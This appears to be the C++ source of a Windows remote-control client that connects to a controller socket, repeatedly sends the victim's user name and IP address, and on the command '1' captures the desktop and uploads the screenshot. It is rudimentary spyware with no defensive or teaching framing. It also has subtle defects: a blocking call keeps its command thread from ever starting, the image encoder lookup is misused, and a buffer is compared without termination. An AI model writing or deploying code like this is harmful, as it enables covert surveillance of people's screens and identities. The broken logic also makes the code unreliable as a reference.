#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <string>
#include <chrono>
#include <thread>
#include <windows.h>
#include <io.h>
#include <fcntl.h>
#include <psapi.h>
#include <gdiplus.h>
#include <vector>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;


void sendClientInfo(SOCKET serverSocket) {
    while (true) {
        char name[256];
        DWORD nameLen = sizeof(name);
        GetUserNameA(name, &nameLen);



        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        hostent* he = gethostbyname(hostname);
        char* ip = inet_ntoa(*(struct in_addr*)*he->h_addr_list);

        std::string clientInfo = std::string(name) + " " + ip;
        send(serverSocket, clientInfo.c_str(), clientInfo.size(), 0);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void createScreenshot(const std::string& filename) {

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);


    HWND desktop = GetDesktopWindow();
    HDC hdcDesktop = GetDC(desktop);
    HDC hdcMemory = CreateCompatibleDC(hdcDesktop);

    RECT desktopRect;
    GetClientRect(desktop, &desktopRect);

    int width = desktopRect.right;
    int height = desktopRect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcDesktop, width, height);
    SelectObject(hdcMemory, hBitmap);
    BitBlt(hdcMemory, 0, 0, width, height, hdcDesktop, 0, 0, SRCCOPY);


    Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    CLSIDFromString(L"image/bmp", &clsid);
    bitmap.Save(std::wstring(filename.begin(), filename.end()).c_str(), &clsid, NULL);


    DeleteObject(hdcMemory);
    ReleaseDC(desktop, hdcDesktop);
    DeleteObject(hBitmap);
    GdiplusShutdown(gdiplusToken);
}

void handleServerCommands(SOCKET serverSocket) {
    char buffer[1024];
    while (true) {
        int bytesReceived = recv(serverSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            break;
        }


        if (strcmp(buffer, "1") == 0) {
            createScreenshot("screenshot.bmp");

            std::ifstream file("screenshot.bmp", std::ios::binary);
            file.seekg(0, std::ios::end);
            size_t fileSize = file.tellg();
            file.seekg(0, std::ios::beg);
            std::vector<char> fileBuffer(fileSize);
            file.read(fileBuffer.data(), fileSize);
            send(serverSocket, fileBuffer.data(), fileSize, 0);
            file.close();
        }
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serverAddr.sin_port = htons(54000);

    connect(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    sendClientInfo(serverSocket);
    std::thread(sendClientInfo, serverSocket).detach();
    std::thread(handleServerCommands, serverSocket).detach();


    while (true) {


        char buffer[1024];
        int recvSize = recv(serverSocket, buffer, sizeof(buffer) - 1, 0);
        if (recvSize == SOCKET_ERROR) {
            std::cerr << "Receive error" << std::endl;
            break;
        }

        buffer[recvSize] = '\0';

        std::string command(buffer);
        if (command == "exit") {
            break;
        }

        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
